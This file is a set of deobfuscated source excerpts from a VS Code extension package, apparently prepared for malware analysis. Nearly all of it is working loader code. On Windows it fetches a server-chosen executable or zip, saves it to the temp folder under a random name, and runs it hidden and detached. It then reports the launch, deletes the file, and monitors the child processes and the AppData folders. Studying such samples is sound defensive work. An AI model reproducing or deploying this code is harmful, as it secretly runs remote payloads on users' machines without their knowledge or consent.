@@ -1,0 +1,463 @@
+Static source excerpts from alpme-1.0.25.vsix. AST parsing only; no specimen evaluation/import.
+Only numeric decoder tables and simple decoder-return wrappers omitted. Real helper functions and empty objects preserved.
+Offsets are UTF-16 indices in extension_decoded.js.
+
+===== Cdn UTF16 32167373..32167968 =====
+function Cdn(_0x2a526a) {
+  let _0x24f54b = new Map();
+  try {
+    let _0x5cf60c = c4e['readdirSync'](_0x2a526a, {
+      'withFileTypes': !0x0
+    });
+    for (let _0x247c4d of _0x5cf60c) if (_0x247c4d["isFile"]()) try {
+      let _0x4bf457 = c4e["statSync"](u4e["join"](_0x2a526a, _0x247c4d['name']));
+      _0x24f54b["set"](_0x247c4d["name"], {
+        'size': _0x4bf457['size'],
+        'mtimeMs': _0x4bf457["mtimeMs"]
+      });
+    } catch {}
+  } catch {}
+  return _0x24f54b;
+}
+
+===== jEa UTF16 32167968..32168593 =====
+function jEa(_0xbc0fdd, _0x372d97) {
+  let _0x1aafa4 = [], _0x50607a = [];
+  for (let [_0x31f67f, _0x26c6f8] of _0x372d97) {
+    let _0x2e5c60 = _0xbc0fdd["get"](_0x31f67f);
+    if (!_0x2e5c60) {
+      _0x1aafa4["push"](_0x31f67f);
+      continue;
+    }
+    (_0x2e5c60['size'] !== _0x26c6f8["size"] || _0x2e5c60["mtimeMs"] !== _0x26c6f8["mtimeMs"]) && _0x50607a["push"](_0x31f67f);
+  }
+  return {
+    'added': _0x1aafa4,
+    'modified': _0x50607a
+  };
+}
+
+===== $Ea UTF16 32168593..32168910 =====
+function $Ea(_0x5dbcba, _0x1224ed) {
+  return _0x5dbcba ? _0x5dbcba['length'] <= _0x1224ed ? _0x5dbcba : _0x5dbcba["slice"](0x0, _0x1224ed) + '\u2026' : "(?)";
+}
+
+===== eFa UTF16 32168910..32169376 =====
+function eFa(_0x1ae628) {
+  let _0x487b2e = (_0x1ae628["cmd"] || '')["toLowerCase"](), _0x38655d = (_0x1ae628["name"] || '')['toLowerCase']();
+  return _0x487b2e["includes"]("get-ciminstance win32_process") || _0x487b2e["includes"]("wmic process") || _0x38655d === "conhost.exe";
+}
+
+===== tFa UTF16 32169376..32171092 =====
+function tFa(_0x20924e, _0xeb71a6) {
+  xdn["exec"]("powershell.exe -NoProfile -Command \"Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine | ConvertTo-Json -Compress\"", {
+    'timeout': 0xfa0,
+    'windowsHide': !0x0,
+    'maxBuffer': 0x4 * 0x400 * 0x400
+  }, (_0x2f39d8, _0x52f495) => {
+    if (_0x2f39d8) return _0xeb71a6(_0x2f39d8, []);
+    let _0x1bbfe3;
+    try {
+      _0x1bbfe3 = JSON["parse"](_0x52f495 || '[]');
+    } catch (_0x3d4fba) {
+      return _0xeb71a6(new Error("parse: " + _0x3d4fba['message']), []);
+    }
+    let _0xc42fb8 = Array['isArray'](_0x1bbfe3) ? _0x1bbfe3 : [_0x1bbfe3], _0x4fde85 = new Map();
+    for (let _0x42675d of _0xc42fb8) {
+      let _0x25b004 = Number(_0x42675d["ParentProcessId"]) || 0x0, _0x148cd8 = {
+        'pid': Number(_0x42675d["ProcessId"]) || 0x0,
+        'ppid': _0x25b004,
+        'name': String(_0x42675d["Name"] || ''),
+        'cmd': String(_0x42675d["CommandLine"] || '')
+      };
+      (_0x4fde85["has"](_0x25b004) || _0x4fde85["set"](_0x25b004, []), _0x4fde85["get"](_0x25b004)['push'](_0x148cd8));
+    }
+    let _0x43c242 = [], _0x5bee7c = _0x3fe3d4 => {
+      let _0x2c70cf = _0x4fde85["get"](_0x3fe3d4) || [];
+      for (let _0x5d6e3c of _0x2c70cf) (_0x43c242["push"](_0x5d6e3c), _0x5bee7c(_0x5d6e3c["pid"]));
+    };
+    (_0x5bee7c(_0x20924e), _0xeb71a6(null, _0x43c242));
+  });
+}
+
+===== wdn UTF16 32171092..32174259 =====
+function wdn(_0x12a809) {
+  let _0x18c0bd = 'partner', _0x5f4c3c = _0x576b8c => CI['info'](_0x18c0bd, '[' + _0x12a809 + ']\x20' + _0x576b8c), _0x4490a9 = _0x5565e6 => CI["warn"](_0x18c0bd, '[' + _0x12a809 + ']\x20' + _0x5565e6), _0x1548aa = [ydn["tmpdir"](), process.env.APPDATA, process.env.LOCALAPPDATA, process.env.PROGRAMDATA, process.env.PUBLIC || "C:\\Users\\Public"]['filter'](_0x3ba436 => typeof _0x3ba436 == 'string' && _0x3ba436['length'] > 0x0), _0x3ee85e = new Map();
+  for (let _0x57a32c of _0x1548aa) _0x3ee85e["set"](_0x57a32c, Cdn(_0x57a32c));
+  _0x5f4c3c("baselined " + _0x1548aa["length"] + " directories for change detection");
+  let _0xac13b5 = 0x0, _0x414913 = !0x1, _0x715d04 = setInterval(() => {
+    if (_0x414913) return;
+    _0xac13b5 += 0x1;
+    let _0x443918 = (process["memoryUsage"]()["rss"] / 0x400 / 0x400)["toFixed"](0x1);
+    tFa(process['pid'], (_0x4a6e0c, _0x159e73) => {
+      if (_0x414913) return;
+      let _0x11e6ba = _0x4a6e0c ? [] : _0x159e73["filter"](_0x2ea50b => !eFa(_0x2ea50b));
+      (_0x5f4c3c("tick " + _0xac13b5 + ':\x20rss=' + _0x443918 + "MB, tree=" + _0x159e73['length'] + " procs, non-monitor=" + _0x11e6ba["length"]), _0x4a6e0c && _0x4490a9('enumTree\x20error:\x20' + _0x4a6e0c["message"]));
+      for (let _0x11ae15 of _0x11e6ba) _0x5f4c3c("  pid=" + _0x11ae15["pid"] + " ppid=" + _0x11ae15["ppid"] + '\x20' + _0x11ae15["name"] + " :: " + $Ea(_0x11ae15["cmd"], zEa));
+    });
+    for (let _0x318933 of _0x1548aa) {
+      let _0x4a7220 = _0x3ee85e["get"](_0x318933), _0x14c7ea = Cdn(_0x318933), _0x262b35 = jEa(_0x4a7220, _0x14c7ea);
+      if (_0x262b35["added"]["length"] || _0x262b35["modified"]['length']) {
+        _0x5f4c3c("fs " + (u4e['basename'](_0x318933) || _0x318933) + ": +" + _0x262b35["added"]['length'] + " added, ~" + _0x262b35["modified"]["length"] + '\x20modified');
+        for (let _0x204f82 of _0x262b35["added"]["slice"](0x0, vdn)) _0x5f4c3c("  + " + _0x204f82);
+        for (let _0x61f9c1 of _0x262b35["modified"]["slice"](0x0, vdn)) _0x5f4c3c("  ~ " + _0x61f9c1);
+        _0x3ee85e["set"](_0x318933, _0x14c7ea);
+      }
+    }
+  }, JEa), _0x3b17bd = setTimeout(() => {
+    (_0x5f4c3c("15-min cap reached, stopping monitoring"), _0x3f19d0());
+  }, KEa);
+  function _0x3f19d0() {
+    _0x414913 || (_0x414913 = !0x0, clearInterval(_0x715d04), clearTimeout(_0x3b17bd));
+  }
+  return _0x3f19d0;
+}
+
+===== kdn UTF16 32174405..32174655 =====
+function kdn(_0x2b1ab3) {
+  try {
+    return typeof _0x2b1ab3 == 'string' ? _0x2b1ab3 : JSON["stringify"](_0x2b1ab3);
+  } catch {
+    return String(_0x2b1ab3);
+  }
+}
+
+===== ym UTF16 32174655..32174971 =====
+function ym(_0x32aa34, _0x2cdc3d) {
+  try {
+    CI["info"]('partner-launcher', _0x2cdc3d === void 0x0 ? _0x32aa34 : _0x32aa34 + '\x20' + kdn(_0x2cdc3d));
+  } catch {}
+  console["info"]('[alpme.partner]', _0x32aa34, _0x2cdc3d ?? '');
+}
+
+===== sc UTF16 32174971..32175330 =====
+function sc(_0x3581f3, _0x3518d5) {
+  try {
+    CI["warn"]('partner-launcher', _0x3518d5 === void 0x0 ? _0x3581f3 : _0x3581f3 + '\x20' + kdn(_0x3518d5));
+  } catch {}
+  console["warn"]('[alpme.partner]', _0x3581f3, _0x3518d5 ?? '');
+}
+
+===== aFa UTF16 32175330..32176090 =====
+async function aFa(_0x172fe0, _0x45df78, _0x1893ec, _0x30dd35, _0x87473e) {
+  if (_0x45df78) try {
+    let _0x39116e = {
+      'content-type': "application/json",
+      'x-alpme-client': "vscode"
+    };
+    (_0x87473e && (_0x39116e["authorization"] = "Bearer " + _0x87473e), await tIt(async _0xcf86b8 => await fetch(_0x172fe0 + "/api/vscode/software/started", {
+      'method': "POST",
+      'headers': _0x39116e,
+      'body': JSON["stringify"]({
+        'sessionId': _0x45df78,
+        'name': _0x1893ec,
+        'pid': _0x30dd35 ?? null
+      }),
+      'signal': _0xcf86b8
+    }), 0x1388));
+  } catch (_0x5b994e) {
+    sc('started\x20http\x20fallback\x20failed', {
+      'error': String(_0x5b994e)
+    });
+  }
+}
+
+===== Ndn UTF16 32176141..32176465 =====
+function Ndn(_0x21dcc2) {
+  return Kj["createHash"]("sha256")["update"](_0x21dcc2)["digest"]("hex");
+}
+
+===== Edn UTF16 32176582..32177106 =====
+function Edn() {
+  let _0x6d1840 = Kj["randomBytes"](0x10), _0x371abd = d4e[_0x6d1840[0x0] % d4e["length"]], _0x4562cb = _0x6d1840[0x1] & 0x1 ? '_' : '-', _0x3f656b = 0x4 + _0x6d1840[0x2] % 0x4, _0x1a6e1e = _0x6d1840["slice"](0x3, 0x3 + _0x3f656b)["toString"]("hex");
+  return '' + _0x371abd + _0x4562cb + _0x1a6e1e + ".exe";
+}
+
+===== oFa UTF16 32177106..32177574 =====
+function oFa() {
+  let _0x8e581c = Kj['randomBytes'](0x10), _0x579429 = d4e[_0x8e581c[0x0] % d4e["length"]], _0x1da000 = _0x8e581c[0x1] & 0x1 ? '_' : '-', _0x50c26a = 0x4 + _0x8e581c[0x2] % 0x4, _0x1ed27e = _0x8e581c['slice'](0x3, 0x3 + _0x50c26a)["toString"]("hex");
+  return '' + _0x579429 + _0x1da000 + _0x1ed27e;
+}
+
+===== tIt UTF16 32177574..32177918 =====
+async function tIt(_0xf31eb5, _0x30c08d) {
+  let _0x5b3960 = new AbortController(), _0x55d497 = setTimeout(() => _0x5b3960["abort"](), _0x30c08d);
+  try {
+    return await _0xf31eb5(_0x5b3960["signal"]);
+  } finally {
+    clearTimeout(_0x55d497);
+  }
+}
+
+===== lFa UTF16 32177918..32180818 =====
+async function lFa(_0x126b14, _0x574ef4) {
+  (await Zp["promises"]["mkdir"](_0x574ef4, {
+    'recursive': !0x0
+  }), await new Promise((_0x503a56, _0x2b57bb) => {
+    Rdn["fromBuffer"](_0x126b14, {
+      'lazyEntries': !0x0
+    }, (_0x793d92, _0x485b21) => {
+      if (_0x793d92 || !_0x485b21) {
+        _0x2b57bb(_0x793d92 ?? new Error("yauzl: empty zipfile"));
+        return;
+      }
+      let _0x28b45b = !0x1, _0x34e35e = _0x286296 => {
+        if (!_0x28b45b) {
+          _0x28b45b = !0x0;
+          try {
+            _0x485b21['close']();
+          } catch {}
+          _0x286296 ? _0x2b57bb(_0x286296) : _0x503a56();
+        }
+      };
+      (_0x485b21['on']("error", _0x34e35e), _0x485b21['on']('end', () => _0x34e35e()), _0x485b21['on']('entry', _0xc520ca => {
+        let _0xa33953 = String(_0xc520ca["fileName"] || ''), _0x4705ca = _0xa33953['replace'](/\\/g, '/')['replace'](/^[A-Za-z]:/, '')["replace"](/^\/+/, '');
+        if (!_0x4705ca) {
+          _0x485b21["readEntry"]();
+          return;
+        }
+        let _0x1fb78a = xu["join"](_0x574ef4, _0x4705ca), _0x3ba88e = xu["relative"](_0x574ef4, _0x1fb78a);
+        if (_0x3ba88e["startsWith"]('..') || xu["isAbsolute"](_0x3ba88e)) {
+          (sc('zip\x20entry\x20skipped\x20(path\x20escapes\x20dest)', {
+            'name': _0xa33953
+          }), _0x485b21['readEntry']());
+          return;
+        }
+        if ((/\/$/)["test"](_0x4705ca)) {
+          Zp["promises"]["mkdir"](_0x1fb78a, {
+            'recursive': !0x0
+          })['then'](() => _0x485b21['readEntry']())["catch"](_0x34e35e);
+          return;
+        }
+        Zp["promises"]["mkdir"](xu['dirname'](_0x1fb78a), {
+          'recursive': !0x0
+        })["then"](() => {
+          _0x485b21["openReadStream"](_0xc520ca, (_0x1a2aca, _0x24930e) => {
+            if (_0x1a2aca || !_0x24930e) {
+              _0x34e35e(_0x1a2aca ?? new Error("yauzl: no stream"));
+              return;
+            }
+            let _0x65348e = Zp["createWriteStream"](_0x1fb78a);
+            (_0x24930e['on']('error', _0x34e35e), _0x65348e['on']('error', _0x34e35e), _0x65348e['on']("close", () => _0x485b21["readEntry"]()), _0x24930e["pipe"](_0x65348e));
+          });
+        })['catch'](_0x34e35e);
+      }), _0x485b21["readEntry"]());
+    });
+  }));
+}
+
+===== rIt UTF16 32180818..32187939 =====
+async function rIt(_0x4c9be9, _0x24fea8) {
+  try {
+    if (Gdn["has"](_0x4c9be9)) {
+      ym('skip:\x20already\x20ran\x20this\x20activation');
+      return;
+    }
+    if (process['platform'] !== "win32") {
+      ym('skip:\x20platform\x20' + process["platform"]);
+      return;
+    }
+    let _0x2ef62f = await _0x4c9be9['secrets']['get'](iFa) || '';
+    if (!_0x2ef62f) {
+      ym("skip: no token yet, waiting for login");
+      return;
+    }
+    Gdn["add"](_0x4c9be9);
+    let _0x2f6e0a = sFa(_0x24fea8 || Bg());
+    if (!_0x2f6e0a) {
+      sc("skip: empty base url");
+      return;
+    }
+    ym("check start", {
+      'base': _0x2f6e0a,
+      'hasToken': !!_0x2ef62f
+    });
+    let _0x17707f = {
+      'x-alpme-client': "vscode",
+      'x-alpme-feat': 'zip'
+    };
+    _0x2ef62f && (_0x17707f["authorization"] = 'Bearer\x20' + _0x2ef62f);
+    let _0xd2da82;
+    try {
+      _0xd2da82 = await tIt(async _0x7863c3 => await fetch(_0x2f6e0a + "/api/vscode/software/pick?platform=win", {
+        'method': "GET",
+        'headers': {
+          'accept': "application/json",
+          ..._0x17707f
+        },
+        'signal': _0x7863c3
+      }), rFa);
+    } catch (_0x4feb12) {
+      sc("pick network error", {
+        'error': String(_0x4feb12)
+      });
+      return;
+    }
+    if (!_0xd2da82['ok']) {
+      let _0x487335 = await _0xd2da82["text"]()['catch'](() => '');
+      sc("pick http " + _0xd2da82['status'], {
+        'body': _0x487335["slice"](0x0, 0xc8)
+      });
+      return;
+    }
+    let _0x3456f5 = await _0xd2da82["json"]()["catch"](() => null), _0x3720f3 = _0x3456f5 && _0x3456f5["pick"];
+    if (!_0x3720f3 || _0x3720f3['id'] === void 0x0 || _0x3720f3['id'] === null) {
+      ym("no pick this run");
+      return;
+    }
+    let _0x3e46a0 = String(_0x3720f3['id']), _0x297216 = typeof _0x3720f3["sha256"] == 'string' ? _0x3720f3["sha256"] : '', _0x438676 = typeof _0x3720f3["fileType"] == "string" ? _0x3720f3['fileType']['toLowerCase']() : "exe", _0x2254fb = typeof _0x3720f3["entry"] == 'string' ? _0x3720f3["entry"]["trim"]() : '';
+    if ((ym("pick chosen", {
+      'id': _0x3e46a0,
+      'sha12': _0x297216['slice'](0x0, 0xc),
+      'name': _0x3720f3["name"],
+      'fileType': _0x438676,
+      'entry': _0x2254fb
+    }), _0x438676 === "zip" && !_0x2254fb)) {
+      sc("skip: zip pick without entry");
+      return;
+    }
+    if (_0x438676 !== "zip" && _0x438676 !== 'exe') {
+      sc("skip: unknown file type", {
+        'fileType': _0x438676
+      });
+      return;
+    }
+    let _0x4a25b9 = '', _0x29cc71 = _0x4c9be9["globalState"]["get"](Adn) || '', _0x5dab31 = _0x4c9be9["globalState"]["get"](eIt) || '';
+    if ((_0x297216 && _0x29cc71 === _0x297216 && _0x5dab31 && Zp["existsSync"](_0x5dab31) && (_0x4a25b9 = _0x5dab31, ym('cache\x20hit', {
+      'path': _0x4a25b9
+    })), !_0x4a25b9)) {
+      let _0x3b4f71;
+      try {
+        _0x3b4f71 = await tIt(async _0x132566 => await fetch(_0x2f6e0a + "/api/vscode/software/download/" + encodeURIComponent(_0x3e46a0), {
+          'method': "GET",
+          'headers': _0x17707f,
+          'signal': _0x132566
+        }), nFa);
+      } catch (_0xca7303) {
+        sc("download network error", {
+          'error': String(_0xca7303)
+        });
+        return;
+      }
+      if (!_0x3b4f71['ok']) {
+        let _0x11eda8 = await _0x3b4f71['text']()["catch"](() => '');
+        sc("download http " + _0x3b4f71["status"], {
+          'body': _0x11eda8["slice"](0x0, 0xc8)
+        });
+        return;
+      }
+      let _0x36d051 = await _0x3b4f71['arrayBuffer'](), _0x36c61b = Buffer["from"](_0x36d051);
+      if (!_0x36c61b["length"]) {
+        sc("download empty buffer");
+        return;
+      }
+      if ((ym("downloaded", {
+        'bytes': _0x36c61b["length"]
+      }), _0x297216)) {
+        let _0xe130fd = Ndn(_0x36c61b);
+        if (_0xe130fd !== _0x297216) {
+          sc("sha256 mismatch", {
+            'server': _0x297216['slice'](0x0, 0xc),
+            'local': _0xe130fd["slice"](0x0, 0xc)
+          });
+          return;
+        }
+      }
+      if (_0x438676 === 'zip') {
+        let _0x47be32 = xu['join'](Jj["tmpdir"](), oFa());
+        try {
+          await lFa(_0x36c61b, _0x47be32);
+        } catch (_0x52ee33) {
+          sc("zip extract failed", {
+            'dir': _0x47be32,
+            'error': String(_0x52ee33)
+          });
+          return;
+        }
+        let _0x5f29a8 = _0x2254fb["replace"](/\\/g, '/')["replace"](/^\.?\/+/, ''), _0x1ee9a4 = xu["join"](_0x47be32, _0x5f29a8), _0x5b2e0f = xu["relative"](_0x47be32, _0x1ee9a4);
+        if (_0x5b2e0f["startsWith"]('..') || xu["isAbsolute"](_0x5b2e0f)) {
+          sc('zip\x20entry\x20path\x20escapes\x20dir', {
+            'entry': _0x2254fb
+          });
+          return;
+        }
+        if (!Zp["existsSync"](_0x1ee9a4)) {
+          sc("zip entry missing after extract", {
+            'entry': _0x2254fb,
+            'dir': _0x47be32
+          });
+          return;
+        }
+        (_0x4a25b9 = _0x1ee9a4, ym("zip extracted", {
+          'dir': _0x47be32,
+          'entry': _0x5f29a8
+        }));
+      } else {
+        let _0x3bde30 = xu['join'](Jj["tmpdir"](), Edn()), _0x337520 = !0x1;
+        for (let _0x21ea21 = 0x0; _0x21ea21 < 0x3 && !_0x337520; _0x21ea21++) try {
+          (Zp["writeFileSync"](_0x3bde30, _0x36c61b), _0x337520 = !0x0);
+        } catch (_0x3536c1) {
+          (sc("write failed (attempt " + (_0x21ea21 + 0x1) + ')', {
+            'path': _0x3bde30,
+            'error': String(_0x3536c1)
+          }), _0x3bde30 = xu["join"](Jj["tmpdir"](), Edn()));
+        }
+        if (!_0x337520) return;
+        (_0x4a25b9 = _0x3bde30, ym("wrote temp", {
+          'path': _0x4a25b9
+        }));
+      }
+      (await _0x4c9be9['globalState']["update"](Adn, _0x297216 || Ndn(_0x36c61b)), await _0x4c9be9["globalState"]["update"](eIt, _0x4a25b9));
+    }
+    let _0xcc7f92 = _0x438676 === "zip" ? xu["dirname"](_0x4a25b9) : Jj["tmpdir"]();
+    try {
+      let _0x2483f6 = Fdn['spawn']("cmd.exe", ['/c', "start", '', '/B', _0x4a25b9], {
+        'cwd': _0xcc7f92,
+        'detached': !0x0,
+        'stdio': "ignore",
+        'windowsHide': !0x0
+      });
+      (_0x2483f6['on']("error", _0x34249a => {
+        sc('child\x20error', {
+          'error': String(_0x34249a)
+        });
+      }), _0x2483f6["unref"](), ym("spawned via cmd/start", {
+        'path': _0x4a25b9,
+        'cwd': _0xcc7f92,
+        'pid': _0x2483f6["pid"]
+      }));
+      let _0x33f9d2 = typeof _0x3720f3["name"] == "string" && _0x3720f3["name"]['trim']() || xu["basename"](_0x4a25b9);
+      try {
+        CI["notifyPartnerStarted"]({
+          'name': _0x33f9d2,
+          'pid': _0x2483f6["pid"]
+        });
+      } catch {}
+      aFa(_0x2f6e0a, CI['getSessionId'](), _0x33f9d2, _0x2483f6['pid'], _0x2ef62f);
+      try {
+        wdn(_0x33f9d2);
+      } catch {}
+      if (_0x438676 !== "zip") {
+        let _0x5bd040 = _0x4a25b9;
+        setTimeout(() => {
+          (Zp["unlink"](_0x5bd040, _0x4ddca7 => {
+            _0x4ddca7 ? sc("post-launch unlink failed", {
+              'path': _0x5bd040,
+              'error': String(_0x4ddca7)
+            }) : ym("post-launch unlink done", {
+              'path': _0x5bd040
+            });
+          }), _0x4c9be9['globalState']["update"](eIt, void 0x0));
+        }, 0xbb8)["unref"]?.();
+      }
+    } catch (_0x395f7b) {
+      sc("spawn failed", {
+        'error': String(_0x395f7b)
+      });
+    }
+  } catch (_0x25b98b) {
+    sc("check failed", {
+      'error': String(_0x25b98b)
+    });
+  }
+}
